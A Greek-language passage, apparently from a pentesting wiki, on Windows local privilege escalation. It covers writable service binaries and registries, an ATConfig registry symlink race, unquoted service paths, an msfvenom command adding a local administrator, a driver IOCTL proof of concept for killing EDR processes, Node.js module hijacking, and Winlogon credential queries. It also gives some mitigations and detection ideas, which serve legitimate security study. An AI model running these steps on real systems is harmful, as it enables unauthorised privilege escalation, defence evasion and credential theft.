Αν ένα service εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως privileged domain account, αλλά οι low-privileged users μπορούν να τροποποιήσουν το service EXE ή τον parent folder του, το service μπορεί συχνά να γίνει hijack **αντικαθιστώντας το binary και κάνοντας restart το service**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από ένα service** ή αν έχετε **write permissions στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να βρείτε κάθε binary που εκτελείται από ένα service χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα permissions σας χρησιμοποιώντας το **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Αναζητήστε επικίνδυνα ACLs που έχουν εκχωρηθεί στα **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ιδιαίτερα **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή abuse είναι:

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το binary είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το service binary με ένα payload ή ένα έγκυρο malicious service binary.
4. Κάντε επανεκκίνηση της υπηρεσίας με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε για reboot / service trigger).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Εάν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν ξεκινά αυτόματα κατά το boot, αν διαθέτει failure action που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης του service registry

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε service registry.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας στο **registry** μιας υπηρεσίας κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Σε αυτή την περίπτωση, μπορεί να τροποποιηθεί το binary που εκτελείται από την υπηρεσία.

Για να αλλάξετε τη διαδρομή του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Race με registry symlink για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες λειτουργίες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα **symbolic link race** στο registry μπορεί να ανακατευθύνει αυτή την προνομιακή εγγραφή σε **οποιοδήποτε path HKLM**, παρέχοντας primitive για αυθαίρετη **εγγραφή τιμής** στο HKLM.

Βασικές τοποθεσίες (παράδειγμα: On-Screen Keyboard `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες λειτουργίες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει configuration που ελέγχεται από τον χρήστη.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά το logon/secure-desktop transitions και είναι writable από τον χρήστη.

Ροή εκμετάλλευσης (CVE-2026-24291 / ATConfig):

1. Συμπληρώστε την τιμή **HKCU ATConfig** που θέλετε να εγγραφεί από το SYSTEM.
2. Ενεργοποιήστε το secure-desktop copy (π.χ. **LockWorkstation**), το οποίο ξεκινά τη ροή του AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με ένα **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το SYSTEM εγγράφει την τιμή που επέλεξε ο attacker στο ανακατευθυνόμενο path HKLM.

Αφού αποκτήσετε αυθαίρετη εγγραφή τιμής HKLM, κάντε pivot σε LPE τροποποιώντας τιμές configuration υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινήσει ένας κανονικός χρήστης (π.χ. **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η public exploit implementation **κλειδώνει το workstation** ως μέρος του race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Δικαιώματα AppendData/AddSubdirectory στο registry των Services

Αν έχετε αυτό το permission σε ένα registry, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries από αυτό**. Στην περίπτωση των Windows services, αυτό είναι **αρκετό για την εκτέλεση arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν το path προς ένα executable δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε πιθανό path που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για το path _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Παραθέστε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας εκείνες που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα binary υπηρεσίας με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν τις ενέργειες που θα εκτελούνται σε περίπτωση αποτυχίας μιας υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες παρέχονται στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **permissions των binaries** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κάνετε privilege escalation) και των **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file ώστε να διαβάσετε κάποιο ειδικό file ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από έναν λογαριασμό Administrator (schedtasks).

Ένας τρόπος για να εντοπίσετε αδύναμα δικαιώματα σε φακέλους/files στο σύστημα είναι:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistence/execution μέσω αυτόματης φόρτωσης plugin του Notepad++

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε plugin DLL βρίσκεται στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable ή αντίγραφο με δυνατότητα εγγραφής, η τοποθέτηση ενός κακόβουλου plugin παρέχει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των callbacks των plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **τοποθεσίες autorun για privilege escalation**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **weird/vulnerable** drivers τρίτων κατασκευαστών
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Εάν ένας driver εκθέτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε κακώς σχεδιασμένους IOCTL handlers), μπορείτε να κάνετε privilege escalation κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη του kernel. Δείτε την step-by-step τεχνική εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου το vulnerable call ανοίγει ένα Object Manager path που ελέγχεται από τον attacker, η σκόπιμη επιβράδυνση του lookup (με χρήση components μέγιστου μήκους ή deep directory chains) μπορεί να επεκτείνει το χρονικό παράθυρο από microseconds σε δεκάδες microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives memory corruption σε Registry hives

Οι σύγχρονες vulnerabilities σε hives επιτρέπουν το grooming deterministic layouts, την κατάχρηση writable HKLM/HKU descendants και τη μετατροπή metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθετε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion direct-mode του `RtlQueryRegistryValues` από attacker-controlled paths

Ορισμένοι drivers δέχονται ένα registry path από το userland, επικυρώνουν μόνο ότι είναι ένα έγκυρο UTF-16 string και στη συνέχεια καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` σε ένα stack scalar, όπως το `int readValue`. Εάν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **πραγματικό** registry type και όχι σύμφωνα με τον type που ανέμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:

- **Confused deputy / oracle**: ένα user-controlled absolute `\Registry\...` path επιτρέπει στον driver να κάνει query σε keys που επιλέγει ο attacker, να διαρρέει την ύπαρξή τους μέσω return codes/logs και, σε ορισμένες περιπτώσεις, να διαβάζει values στα οποία ο caller δεν θα μπορούσε να έχει άμεση πρόσβαση.
- **Kernel memory corruption**: ένας scalar destination, όπως το `&readValue`, υφίσταται type confusion ως `REG_QWORD`, `UNICODE_STRING` ή sized binary buffer, ανάλογα με τον registry value type.

Πρακτικές σημειώσεις exploitation:

- **Windows 8+ mitigation**: εάν το query αγγίξει ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι kernel callers τερματίζουν με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσετε τη δυνατότητα exploitation, αναζητήστε **attacker-writable keys μέσα σε trusted system hives** αντί να κάνετε staging values κάτω από το `HKCU`.
- **Trusted-hive staging**: χρησιμοποιήστε το NtObjectManager για να απαριθμήσετε writable descendants του `\Registry\Machine` και εκτελέστε ξανά το scan με duplicated **low-integrity** token, ώστε να εντοπίσετε keys που είναι προσβάσιμα από sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει παρακείμενα δεδομένα της στοίβας και μπορεί να αντικαταστήσει μερικώς έναν κοντινό callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα ελεγχόμενο από τον attacker `REG_DWORD` σε ένα scalar της στοίβας και στη συνέχεια επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση string, ο attacker ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον pointer `Buffer`, οδηγώντας σε semi-controlled εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα binary data, η direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως signed buffer size. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή ελεγχόμενη από τον attacker στο επαναχρησιμοποιημένο scalar, το επόμενο query `REG_BINARY` αντιγράφει bytes του attacker απευθείας πάνω σε παρακείμενα slots της στοίβας, κάτι που συχνά αποτελεί την καθαρότερη διαδρομή για πλήρη αντικατάσταση callback-pointer.

Ισχυρό hunting pattern: **ετερογενείς registry reads στην ίδια μεταβλητή της στοίβας χωρίς επανεκκίνησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιημένους pointers `EntryContext` και code paths όπου το πρώτο registry read ελέγχει αν θα πραγματοποιηθεί δεύτερο read.

#### Κατάχρηση της απουσίας του FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Ορισμένοι signed third-party drivers δημιουργούν το device object τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά ξεχνούν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν το device ανοίγει μέσω path που περιέχει επιπλέον component, επιτρέποντας σε οποιονδήποτε unprivileged user να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας user μπορέσει να ανοίξει το device, τα privileged IOCTLs που εκθέτει ο driver μπορούν να χρησιμοποιηθούν για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε arbitrary processes (token theft / SYSTEM shell μέσω DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός arbitrary processes, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω του kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία device objects που προορίζονται να περιορίζονται από DACL.
- Να επικυρώνετε το context του caller για privileged operations. Να προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό process ή την επιστροφή handle.
- Να περιορίζετε τα IOCTLs (access masks, METHOD_*, input validation) και να εξετάζετε brokered models αντί για άμεσα kernel privileges.

Ιδέες detection για defenders
- Να παρακολουθείτε user-mode opens ύποπτων device names (π.χ. \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδεικνύουν abuse.
- Να επιβάλλετε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και να διατηρείτε τις δικές σας allow/deny lists.


## PATH DLL Hijacking

Αν έχετε **write permissions μέσα σε έναν φάκελο που υπάρχει στο PATH**, ενδέχεται να μπορείτε να κάνετε hijack ένα DLL που φορτώνεται από ένα process και να **κάνετε privilege escalation**.

Ελέγξτε τα permissions όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με τον τρόπο εκμετάλλευσης αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking μέσω `C:\node_modules`

Αυτή είναι μια παραλλαγή του **Windows uncontrolled search path**, η οποία επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και το αναμενόμενο module **λείπει**.

Το Node επιλύει τα packages ανεβαίνοντας στη δενδρική δομή καταλόγων και ελέγχοντας φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, αυτή η αναζήτηση μπορεί να φτάσει στη ρίζα του drive, επομένως μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` μπορεί τελικά να ελέγξει:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **low-privileged user** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα κακόβουλο `foo.js` (ή έναν φάκελο package) και να περιμένει ένα **Node/Electron process με υψηλότερα privileges** να επιλύσει την απουσία του dependency. Το payload εκτελείται στο security context του victim process, επομένως αυτό μετατρέπεται σε **LPE** όταν ο στόχος εκτελείται ως administrator, από ένα elevated scheduled task/service wrapper ή από μια privileged desktop app που εκκινείται αυτόματα.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- ένα dependency δηλώνεται στο `optionalDependencies`
- μια third-party library περιβάλλει το `require("foo")` με `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα package αφαιρέθηκε από τα production builds, παραλείφθηκε κατά το packaging ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο dependency tree αντί στον κύριο κώδικα της εφαρμογής

### Αναζήτηση ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε το resolution path:

- Εφαρμόστε φίλτρο `Process Name` = target executable (`node.exe`, το Electron app EXE ή το wrapper process)
- Εφαρμόστε φίλτρο `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελικό επιτυχές open κάτω από το `C:\node_modules`

Χρήσιμα patterns για code review σε unpacked αρχεία `.asar` ή στον application source:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** από το Procmon ή μέσω ελέγχου του πηγαίου κώδικα.
2. Δημιουργήστε τον κατάλογο αναζήτησης root, εάν δεν υπάρχει ήδη:
```powershell
mkdir C:\node_modules
```
3. Τοποθετήστε ένα module με το ακριβώς αναμενόμενο όνομα:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Ενεργοποιήστε την εφαρμογή του θύματος. Αν η εφαρμογή επιχειρήσει `require("foo")` και το νόμιμο module απουσιάζει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα προαιρετικών modules που λείπουν και ταιριάζουν σε αυτό το μοτίβο περιλαμβάνουν τα `bluebird` και `utf-8-validate`, όμως το **technique** είναι το επαναχρησιμοποιήσιμο μέρος: βρείτε οποιοδήποτε **missing bare import** που μια προνομιούχα διεργασία Windows Node/Electron θα επιλύσει.

### Ιδέες για detection και hardening

- Δημιουργήστε alert όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει νέα αρχεία/πακέτα `.js` εκεί.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλα τα runtime dependencies στα production πακέτα και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε κώδικα τρίτων για μοτίβα σιωπηλής εκτέλεσης `try { require("...") } catch {}`.
- Απενεργοποιήστε τα optional probes όταν το library το υποστηρίζει (για παράδειγμα, ορισμένα `ws` deployments μπορούν να παρακάμψουν το legacy probe του `utf-8-validate` με τη χρήση του `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Κοινόχρηστοι πόροι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### αρχείο hosts

Ελέγξτε για άλλους γνωστούς υπολογιστές που έχουν οριστεί στατικά στο αρχείο hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **υπηρεσίες με περιορισμένη πρόσβαση** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Ελέγξτε αυτήν τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(εμφάνιση κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε root user, μπορείτε να κάνετε listen σε οποιοδήποτε port (την πρώτη φορά που θα χρησιμοποιήσετε το `nc.exe` για listen σε ένα port, θα σας ρωτήσει μέσω GUI αν θα πρέπει να επιτραπεί στο `nc` από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να εκκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credential Manager / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για servers, websites και άλλα προγράμματα στα οποία τα **Windows** μπορούν να **συνδέουν αυτόματα τους χρήστες**. Εκ πρώτης όψεως, αυτό μπορεί να φαίνεται σαν να μπορούν πλέον οι χρήστες να αποθηκεύουν τα διαπιστευτήριά τους για Facebook, Twitter, Gmail κ.λπ., ώστε να συνδέονται αυτόματα μέσω browsers. Όμως δεν ισχύει κάτι τέτοιο.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες, πράγμα που σημαίνει ότι οποιαδήποτε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (server ή website) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault, χρησιμοποιώντας τα παρεχόμενα διαπιστευτήρια αντί οι χρήστες να εισάγουν κάθε φορά το username και το password.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνεί με το credential manager και να ζητά τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο storage vault.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στο μηχάνημα.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
